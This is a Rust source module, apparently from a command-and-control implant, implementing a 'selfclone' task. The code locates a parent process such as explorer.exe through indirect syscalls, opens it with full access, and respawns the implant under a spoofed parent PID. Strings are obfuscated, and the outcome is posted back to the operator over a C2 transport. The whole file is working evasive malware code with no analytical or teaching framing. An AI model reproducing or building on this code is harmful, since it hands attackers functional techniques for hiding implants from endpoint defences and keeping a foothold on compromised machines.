use crate::hellshall::{NtSyscall, RunSyscall, SetSSn, fetch_nt_syscall, crc32h};
use crate::transport;

use std::mem;
use std::ptr;
use std::slice;

use winapi::shared::ntdef::{NTSTATUS, PVOID, ULONG, UNICODE_STRING, LARGE_INTEGER, HANDLE};
use winapi::shared::minwindef::{FALSE, LPVOID};
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::GetModuleFileNameW;
use winapi::um::processthreadsapi::{
    CreateProcessW, InitializeProcThreadAttributeList, UpdateProcThreadAttribute,
    DeleteProcThreadAttributeList, PROCESS_INFORMATION, STARTUPINFOW,
};
use winapi::um::winbase::{CREATE_NEW_CONSOLE, EXTENDED_STARTUPINFO_PRESENT};
use winapi::um::winnt::PROCESS_ALL_ACCESS;
use obfstr::obfstr;

const MAX_PATH_LEN: usize = 260;
const SystemProcessInformation: u32 = 5;
const BUFFER_SIZE: usize = 0x100000;
const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;

type LONG = i32;
type KPRIORITY = LONG;

#[repr(C)]
struct SYSTEM_THREAD_INFORMATION {
    Reserved1: [LARGE_INTEGER; 3],
    Reserved2: [usize; 2],
    StartAddress: PVOID,
    ClientId: [PVOID; 2],
    Priority: LONG,
    BasePriority: LONG,
    ContextSwitches: ULONG,
    ThreadState: ULONG,
    WaitReason: ULONG,
}

#[repr(C)]
struct SYSTEM_PROCESS_INFORMATION {
    NextEntryOffset: ULONG,
    NumberOfThreads: ULONG,
    WorkingSetPrivateSize: LARGE_INTEGER,
    HardFaultCount: ULONG,
    NumberOfThreadsHighWatermark: ULONG,
    CycleTime: u64,
    CreateTime: LARGE_INTEGER,
    UserTime: LARGE_INTEGER,
    KernelTime: LARGE_INTEGER,
    ImageName: UNICODE_STRING,
    BasePriority: KPRIORITY,
    UniqueProcessId: PVOID,
    InheritedFromUniqueProcessId: PVOID,
    HandleCount: ULONG,
    SessionId: ULONG,
    UniqueProcessKey: usize,
    PeakVirtualSize: usize,
    VirtualSize: usize,
    PageFaultCount: ULONG,
    PeakWorkingSetSize: usize,
    WorkingSetSize: usize,
    QuotaPeakPagedPoolUsage: usize,
    QuotaPagedPoolUsage: usize,
    QuotaPeakNonPagedPoolUsage: usize,
    QuotaNonPagedPoolUsage: usize,
    PagefileUsage: usize,
    PeakPagefileUsage: usize,
    PrivatePageCount: usize,
    ReadOperationCount: i64,
    WriteOperationCount: i64,
    OtherOperationCount: i64,
    ReadTransferCount: i64,
    WriteTransferCount: i64,
    OtherTransferCount: i64,
    Threads: [SYSTEM_THREAD_INFORMATION; 1],
}

#[repr(C)]
struct STARTUPINFOEXW {
    startup_info: STARTUPINFOW,
    lp_attribute_list: PVOID,
}

/// Find the PID of a process by name using NtQuerySystemInformation via indirect syscall.
unsafe fn find_process_pid(target_name: &str) -> Option<u32> {
    let hash = crc32h("NtQuerySystemInformation");
    let mut syscall: NtSyscall = mem::zeroed();
    if !fetch_nt_syscall(hash, &mut syscall) {
        return None;
    }

    SetSSn(syscall.dw_ssn as u16, syscall.p_syscall_inst_address);

    let mut buffer = vec![0u8; BUFFER_SIZE];
    let mut return_len: ULONG = 0;

    let status: NTSTATUS = RunSyscall(
        SystemProcessInformation as _,
        buffer.as_mut_ptr() as _,
        BUFFER_SIZE as _,
        &mut return_len as *mut _ as _,
        ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
        ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
        ptr::null_mut(),
    );

    if status != 0 {
        return None;
    }

    let target_lower = target_name.to_lowercase();
    let mut offset = 0usize;

    while offset < return_len as usize {
        let proc_info = buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION;
        let pid = (*proc_info).UniqueProcessId as u32;

        if (*proc_info).ImageName.Length > 0 {
            let name_slice = slice::from_raw_parts(
                (*proc_info).ImageName.Buffer,
                (*proc_info).ImageName.Length as usize / 2,
            );
            let name = String::from_utf16_lossy(name_slice).to_lowercase();
            if name == target_lower {
                return Some(pid);
            }
        }

        if (*proc_info).NextEntryOffset == 0 {
            break;
        }
        offset += (*proc_info).NextEntryOffset as usize;
    }

    None
}

/// Open a process handle via NtOpenProcess indirect syscall.
unsafe fn open_process(pid: u32) -> Option<HANDLE> {
    let hash = crc32h("NtOpenProcess");
    let mut syscall: NtSyscall = mem::zeroed();
    if !fetch_nt_syscall(hash, &mut syscall) {
        return None;
    }

    #[repr(C)]
    struct OBJECT_ATTRIBUTES {
        Length: ULONG,
        RootDirectory: HANDLE,
        ObjectName: PVOID,
        Attributes: ULONG,
        SecurityDescriptor: PVOID,
        SecurityQualityOfService: PVOID,
    }

    #[repr(C)]
    struct CLIENT_ID {
        UniqueProcess: HANDLE,
        UniqueThread: HANDLE,
    }

    let mut handle: HANDLE = ptr::null_mut();

    let mut oa: OBJECT_ATTRIBUTES = mem::zeroed();
    oa.Length = mem::size_of::<OBJECT_ATTRIBUTES>() as ULONG;

    let mut cid: CLIENT_ID = mem::zeroed();
    cid.UniqueProcess = pid as usize as HANDLE;

    SetSSn(syscall.dw_ssn as u16, syscall.p_syscall_inst_address);

    let status: NTSTATUS = RunSyscall(
        &mut handle as *mut _ as _,          // ProcessHandle
        PROCESS_ALL_ACCESS as usize as _,    // DesiredAccess
        &mut oa as *mut _ as _,              // ObjectAttributes
        &mut cid as *mut _ as _,             // ClientId
        ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
        ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
        ptr::null_mut(),
    );

    if status == 0 && !handle.is_null() {
        Some(handle)
    } else {
        None
    }
}

/// Spawn a clone of the current process with a spoofed parent PID.
fn clone_with_ppid_spoof(parent_handle: HANDLE) -> Result<u32, String> {
    unsafe {
        // Get our own executable path
        let mut path_buf = [0u16; MAX_PATH_LEN * 2];
        let len = GetModuleFileNameW(
            ptr::null_mut(),
            path_buf.as_mut_ptr(),
            (MAX_PATH_LEN * 2) as u32,
        );
        if len == 0 {
            return Err("Failed to get own executable path".into());
        }

        // Initialize the attribute list for PPID spoofing
        let mut attr_size: usize = 0;

        // First call to get required size
        InitializeProcThreadAttributeList(
            ptr::null_mut(),
            1,
            0,
            &mut attr_size as *mut _,
        );

        if attr_size == 0 {
            return Err("Failed to get attribute list size".into());
        }

        let attr_list = vec![0u8; attr_size];
        let attr_list_ptr = attr_list.as_ptr() as PVOID;

        let ret = InitializeProcThreadAttributeList(
            attr_list_ptr as *mut _,
            1,
            0,
            &mut attr_size as *mut _,
        );
        if ret == 0 {
            return Err("InitializeProcThreadAttributeList failed".into());
        }

        // Set the parent process attribute
        let mut parent_h = parent_handle;
        let ret = UpdateProcThreadAttribute(
            attr_list_ptr as *mut _,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &mut parent_h as *mut _ as LPVOID,
            mem::size_of::<HANDLE>(),
            ptr::null_mut(),
            ptr::null_mut(),
        );
        if ret == 0 {
            DeleteProcThreadAttributeList(attr_list_ptr as *mut _);
            return Err("UpdateProcThreadAttribute failed".into());
        }

        // Set up STARTUPINFOEXW
        let mut si_ex: STARTUPINFOEXW = mem::zeroed();
        si_ex.startup_info.cb = mem::size_of::<STARTUPINFOEXW>() as u32;
        si_ex.lp_attribute_list = attr_list_ptr;

        let mut pi: PROCESS_INFORMATION = mem::zeroed();

        // Create the process with the spoofed parent
        let ret = CreateProcessW(
            path_buf.as_ptr(),                      // lpApplicationName (our own exe)
            ptr::null_mut(),                        // lpCommandLine
            ptr::null_mut(),                        // lpProcessAttributes
            ptr::null_mut(),                        // lpThreadAttributes
            FALSE,                                  // bInheritHandles
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, // dwCreationFlags
            ptr::null_mut(),                        // lpEnvironment
            ptr::null_mut(),                        // lpCurrentDirectory
            &mut si_ex.startup_info as *mut _,      // lpStartupInfo
            &mut pi as *mut _,                      // lpProcessInformation
        );

        // Clean up attribute list
        DeleteProcThreadAttributeList(attr_list_ptr as *mut _);

        if ret == 0 {
            return Err("CreateProcessW failed".into());
        }

        let new_pid = pi.dwProcessId;

        // Close handles — the new process is fully independent
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        Ok(new_pid)
    }
}

pub fn selfclone(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let id = task.get("id").unwrap().as_str().unwrap();
    let timestamp = task.get(obfstr!("timestamp")).unwrap().as_f64().unwrap();

    // Parse optional parent process name from parameters
    let params_str = task.get("parameters").and_then(|p| p.as_str()).unwrap_or("{}");
    let params: serde_json::Value = serde_json::from_str(params_str).unwrap_or(serde_json::json!({}));
    let parent_name = params.get("parent")
        .and_then(|v| v.as_str())
        .unwrap_or("explorer.exe");

    crate::helpers::churn(parent_name);

    let (output, status) = unsafe {
        // Step 1: Find the target parent process
        match find_process_pid(parent_name) {
            None => {
                (format!("Failed to find parent process: {}", parent_name), "error")
            }
            Some(parent_pid) => {
                // Step 2: Open handle to the parent
                match open_process(parent_pid) {
                    None => {
                        (format!("Failed to open handle to {} (PID {})", parent_name, parent_pid), "error")
                    }
                    Some(parent_handle) => {
                        // Step 3: Create the clone with spoofed PPID
                        let result = clone_with_ppid_spoof(parent_handle);
                        CloseHandle(parent_handle);

                        match result {
                            Ok(new_pid) => {
                                (format!("Cloned under {} (PID {}). New process PID: {}", parent_name, parent_pid, new_pid), "success")
                            }
                            Err(e) => {
                                (format!("Clone failed: {}", e), "error")
                            }
                        }
                    }
                }
            }
        }
    };

    let response_json = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [
            {
                obfstr!("task_id"): id,
                obfstr!("user_output"): output,
                obfstr!("timestamp"): timestamp,
                obfstr!("status"): status,
                obfstr!("completed"): true,
            }
        ]
    });

    let response_value = serde_json::to_string(&response_json)?;
    transport::send_request(&response_value)?;

    Ok(())
}
